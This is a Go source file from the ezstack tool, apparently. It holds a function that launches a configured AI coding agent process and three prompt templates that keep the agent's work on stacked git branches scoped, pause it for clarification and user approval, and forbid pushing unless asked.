func spawnAgentProcess(agentCmd, workDir, prompt string) error {
	fields := strings.Fields(agentCmd)
	if len(fields) == 0 {
		return fmt.Errorf("agent_command is empty")
	}
	args := append(fields[1:], prompt)
	cmd := exec.Command(fields[0], args...)
	cmd.Dir = workDir
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		// If the agent exited with a non-zero code, propagate it cleanly
		if exitErr, ok := err.(*exec.ExitError); ok {
			os.Exit(exitErr.ExitCode())
		}
		return err
	}
	return nil
}

// ── Default prompt templates ───────────────────────────────────────────────────

// ezsDocsReference is the full embedded DOCUMENTATION.md, injected into the
// shipped prompt as {{EZS_DOCS}} when the MCP is not active.
var ezsDocsReference = ezstack.Documentation

// defaultWorkBranchPromptTemplate is used when the agent is scoped to a single branch (--branch).
const defaultWorkBranchPromptTemplate = `You are working inside an ezstack-managed repository that uses stacked PRs with git worktrees.

## FIRST ACTIONS (do these before responding to the user)
1. cd to {{WORKTREE_PATH}} and run "ezs diff" to see what this branch changes relative to its parent. This is MANDATORY and must be your first action — do not respond to the user until it is done.
2. Skim the worktree to understand the branch's purpose.
3. If the user has not given you a task, briefly summarize what this branch does and ask what they want to work on.
4. If the user's task is unclear or the branch's purpose is ambiguous, ask the user to clarify before making changes.

## Rules
- Always pass -y to ezs commands (e.g. "ezs -y commit", "ezs -y push") to skip confirmations.
- Commit with "ezs -y commit", not "git commit" (ezs commit auto-syncs children). Push with "ezs -y push", not "git push".
- Scope: you may only WRITE to files inside {{WORKTREE_PATH}}. Reading sibling worktrees for context is fine and encouraged.
- Do not create new branches or modify other branches in the stack. All changes must be relevant to this branch's purpose.
- Keep changes small and focused for easy review.
- Run tests / typecheck before committing. A broken middle branch blocks everything above it in the stack.

## Reporting Back
When your work is done: commit with "ezs -y commit", then summarize what you changed in 1–3 sentences. Do not push or open a PR unless the user asks.

## Current Stack
{{STACK_JSON}}

## Your Branch
- Branch: {{BRANCH_NAME}}
- Parent: {{PARENT_NAME}}
- Worktree: {{WORKTREE_PATH}}

{{CUSTOM_INSTRUCTIONS}}
{{REPO_INSTRUCTIONS}}

## Reference — read on demand
The full ezstack documentation is below. Do not read it top-to-bottom; consult it when you hit a specific question.
{{EZS_DOCS}}
`

// defaultWorkStackPromptTemplate is used when the agent works on an entire stack (no --branch).
const defaultWorkStackPromptTemplate = `You are working inside an ezstack-managed repository that uses stacked PRs with git worktrees.

## FIRST ACTIONS (do these before responding to the user)
1. For each branch in the stack, cd to its worktree and run "ezs diff". This is MANDATORY and must be your first action — do not respond to the user until it is done for every branch.
2. Explore the codebase structure from the ROOT branch's worktree (the bottom of the stack — all branches share history below it, so either the root or any single branch works for a structural overview).
3. If the user has not given you a task, briefly summarize the stack (branch-by-branch, one line each) and ask what they want to work on.
4. If any branch's purpose is unclear, ask the user to clarify before making changes.

## Rules
- Always pass -y to ezs commands (e.g. "ezs -y commit", "ezs -y push") to skip confirmations.
- Commit with "ezs -y commit", not "git commit" (ezs commit auto-syncs children). Push with "ezs -y push", not "git push".
- Work across any branch in this stack as needed. Before modifying a branch, cd to its worktree. Use "ezs goto <branch>" or cd directly.
- Keep each branch's changes focused and relevant to that branch's purpose. Do not create branches outside this stack.
- Run tests / typecheck before committing each branch. A broken middle branch blocks everything above it in the stack.

## Reporting Back
When your work is done: commit affected branches with "ezs -y commit", then summarize what changed per branch in 1–3 sentences. Do not push or open a PR unless the user asks.

## Current Stack
{{STACK_JSON}}

{{CUSTOM_INSTRUCTIONS}}
{{REPO_INSTRUCTIONS}}

## Reference — read on demand
The full ezstack documentation is below. Do not read it top-to-bottom; consult it when you hit a specific question.
{{EZS_DOCS}}
`

// defaultFeaturePromptTemplate is used when the agent builds a feature as stacked branches.
// When an existing stack is available, {{EXISTING_STACK_SECTION}} provides its context
// and {{PROCESS_INSTRUCTIONS}} adapts to use existing branches.
const defaultFeaturePromptTemplate = `You are working inside an ezstack-managed repository that uses stacked PRs with git worktrees.

## FIRST ACTIONS (do these before writing any code)
1. Read the feature description below. If it is vague, ambiguous, or missing key details, ask the user to clarify before doing anything else.
2. Explore the codebase enough to understand how the feature fits in.
3. Present a detailed plan of stacked branches to the user and STOP. Do not create branches or write code yet.
4. Wait for explicit approval from the user. If their response is ambiguous, ask — do not proceed on vague signals.

## Rules
- Always pass -y to ezs commands (e.g. "ezs -y commit", "ezs -y push") to skip confirmations.
- Commit with "ezs -y commit", not "git commit" (ezs commit auto-syncs children). Push with "ezs -y push", not "git push".
- Each branch is one reviewable unit of work (~100–300 lines of diff ideal). If a branch grows past ~400 lines, STOP and split it before continuing.
- Run tests / typecheck before committing each branch. A broken middle branch blocks everything above it in the stack.
- Earlier branches must not depend on later ones. Include tests in the same branch as the code they test when practical.
- Use descriptive branch names (e.g. "add-user-model", "add-user-api", "add-user-tests").

## Reporting Back
After each branch: commit with "ezs -y commit" and report the branch name + 1–2 line summary. After the full stack: summarize the stack end-to-end. Do not push or open PRs unless the user asks.

## Feature to Implement
{{FEATURE_DESCRIPTION}}

{{EXISTING_STACK_SECTION}}
{{PROCESS_INSTRUCTIONS}}

{{CUSTOM_INSTRUCTIONS}}
{{REPO_INSTRUCTIONS}}

## Reference — read on demand
The full ezstack documentation is below. Do not read it top-to-bottom; consult it when you hit a specific question.
{{EZS_DOCS}}
`
